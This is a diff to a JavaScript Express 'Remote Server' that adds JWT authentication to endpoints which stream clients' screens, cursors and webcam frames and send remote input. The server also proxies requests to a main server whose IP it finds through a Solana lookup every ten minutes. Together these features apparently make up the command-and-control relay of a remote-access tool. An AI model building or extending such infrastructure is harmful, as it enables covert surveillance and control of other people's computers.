@@ -1,45 +1,71 @@
 // language: JavaScript, file: server.js (Remote Server)
 import express from 'express';
 import cors from 'cors';
+import jwt from 'jsonwebtoken';
+import dotenv from 'dotenv';
 import { startUdp, getFrame, getWebcamFrame, getCursor, getMonitors, sendInput, sendCfg } from './net.js';
 import { fetchSolanaIp, getMainIp } from './discovery.js';
 import path from 'node:path';
 import { fileURLToPath } from 'node:url';
 
+dotenv.config();
 const __dirname = path.dirname(fileURLToPath(import.meta.url));
 const app = express();
 app.use(cors());
 app.use(express.json());
 
+// MUST MATCH the main server's JWT_SECRET
+const JWT_SECRET = process.env.JWT_SECRET || 'dev_only_change_me';
+
+// ─── Auth Middleware ────────────────────────────────────────────────────────
+function requireAuth(req, res, next) {
+  let token = req.query.token;
+  
+  if (!token && req.headers.authorization) {
+    const parts = req.headers.authorization.split(' ');
+    if (parts.length === 2 && parts[0] === 'Bearer') {
+      token = parts[1];
+    }
+  }
+
+  if (!token) return res.status(401).json({ error: 'unauthorized' });
+  try {
+    req.user = jwt.verify(token, JWT_SECRET);
+    next();
+  } catch {
+    return res.status(401).json({ error: 'unauthorized' });
+  }
+}
+
 // ─── Local Stream Endpoints (UDP) ───────────────────────────────────────────
-app.get('/api/clients/:id/screen', (req, res) => {
+app.get('/api/clients/:id/screen', requireAuth, (req, res) => {
   const bytes = getFrame(Number(req.params.id));
   if (!bytes) return res.status(204).end();
   res.setHeader('Content-Type', 'image/webp');
   res.send(bytes);
 });
 
-app.get('/api/clients/:id/cursor', (req, res) => {
+app.get('/api/clients/:id/cursor', requireAuth, (req, res) => {
   const c = getCursor(Number(req.params.id));
   if (!c) return res.status(204).end();
   res.json(c);
 });
 
-app.get('/api/clients/:id/monitors', (req, res) => {
+app.get('/api/clients/:id/monitors', requireAuth, (req, res) => {
   res.json(getMonitors(Number(req.params.id)));
 });
 
-app.post('/api/clients/:id/input', (req, res) => {
+app.post('/api/clients/:id/input', requireAuth, (req, res) => {
   const ok = sendInput(Number(req.params.id), JSON.stringify(req.body));
   res.json({ ok });
 });
 
-app.post('/api/clients/:id/rdp/update', (req, res) => {
+app.post('/api/clients/:id/rdp/update', requireAuth, (req, res) => {
   const ok = sendCfg(Number(req.params.id), JSON.stringify(req.body));
   res.json({ ok });
 });
 
-app.get('/api/clients/:id/webcam', (req, res) => {
+app.get('/api/clients/:id/webcam', requireAuth, (req, res) => {
   const bytes = getWebcamFrame(Number(req.params.id));
   if (!bytes) return res.status(204).end();
   res.setHeader('Content-Type', 'image/jpeg');
@@ -54,7 +80,6 @@ app.use('/api', async (req, res) => {
   }
 
   try {
-    // Log the proxy request so you can see the dashboard talking to the remote server
     console.log(`[proxy] ${req.method} ${req.url} -> ${mainIp}`);
 
     const url = `http://${mainIp}` + req.originalUrl;
@@ -92,7 +117,6 @@ startUdp({
   },
 });
 
-// Fetch main IP on boot and then every 10 mins
 fetchSolanaIp();
 setInterval(fetchSolanaIp, 10 * 60 * 1000);
 
